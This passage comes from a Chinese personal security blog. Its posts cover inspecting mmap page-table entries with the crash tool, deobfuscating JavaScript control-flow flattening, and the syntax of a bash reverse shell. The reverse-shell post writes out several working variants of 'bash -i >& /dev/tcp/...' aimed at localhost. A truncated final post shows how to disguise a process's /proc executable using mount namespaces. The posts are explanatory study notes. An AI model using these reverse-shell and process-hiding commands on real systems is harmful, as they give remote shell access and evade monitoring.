-<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
-<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
-<li><p>准备源码</p>
-<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
-</li>
-<li><p>使用<code>crash</code>分析”页表项”的变化</p>
-<p>首先简单说一下crash的安装和使用。</p>
-<p>如果你是centos系统，就可以用以下命令来安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
-
-<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
-
-<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
-<p>怎么样，crash验证这个结论是不是很简单？</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
-<blockquote>
-<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
-</blockquote>
-<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
-<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
-<p>反混淆思路：</p>
-<ul>
-<li>按照”while-switch-case”执行顺序，拼接case语句</li>
-</ul>
-<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
-<li><p>怎么实现？</p>
-<p>分为两步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么获取”case块的执行顺序”？</p>
-<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
-<p>原始代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>插桩后,代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
-
-<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
-<p>上面都是伪代码，具体实现见 hook.js</p>
-</li>
-<li><p>怎么拼接case块？</p>
-<p>伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
-
-<p>具体实现见 simple_decode.js</p>
-</li>
-</ul>
-<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
-<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>转换成 阅读性更好一些的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
-</ul>
-<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
-<ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
-</li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
-</li>
-</ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
-
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
-<ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
-</ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/" class="post-title-link" itemprop="url">如何伪装进程信息</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hWd0EOaBgVbgTBjsdg7QfA">如何改变进程名称</a> 中提到了一些隐藏进程信息的方式，当时遗留有一个问题：不论哪种方式，exe文件仍然有原程序相关信息。</p>
-<p>本文将总结两种”隐藏/proc/{pid}/exe文件”的方式，并浅析两种方式的隐藏效果。</p>
-<p>两种方式包括：</p>
-<ul>
-<li>mount命名空间</li>
-<li>修改软链接内容</li>
-</ul>
-<h1 id="mount命名空间"><a href="#mount命名空间" class="headerlink" title="mount命名空间"></a>mount命名空间</h1><ul>
-<li><p>现象</p>
-<p>思路来源于<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CSrodJeMFmGNMHyp1PCTSQ">基于Linux Namespaces 特性实现的消音</a></p>
-<p>先来看一个现象：<code>/proc/31867/exe</code>指向的可执行文件内容是一串文本。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1002/235514_50f14956_83508.png" alt="图一" title="屏幕截图.png"></p>
-<p>难道文本内容可以被当做二进制文件执行吗？</p>
-<p>答案当然是不行的。这里只是执行/tmp/sleep命令的方式比较特殊，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# echo 111 &gt; &#x2F;tmp&#x2F;sleep</span><br><span class="line">[root@instance-fj5pftdp ~]# unshare -m bash -c &quot;mount -t tmpfs xx &#x2F;tmp&#x2F;;cp &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;tmp&#x2F;sleep;&#x2F;tmp&#x2F;sleep 1000&quot; &amp;</span><br><span class="line">[1] 31865</span><br><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep sleep</span><br><span class="line">root      31867  0.0  0.0 108052   612 pts&#x2F;74   S    10:01   0:00 &#x2F;tmp&#x2F;sleep 1000</span><br></pre></td></tr></table></figure>
-
-<p><code>unshare -m</code>命令创建了一个新的”mount命名空间”，然后在这个空间中挂载了tmpfs文件系统，最后执行sleep程序。</p>
-</li>
-<li><p>“mount命名空间”是什么？</p>
-<p>“命名空间”是容器的核心原理之一。从效果上来看，”mount命名空间”可以让宿主机和容器中的”挂载信息”隔离。</p>
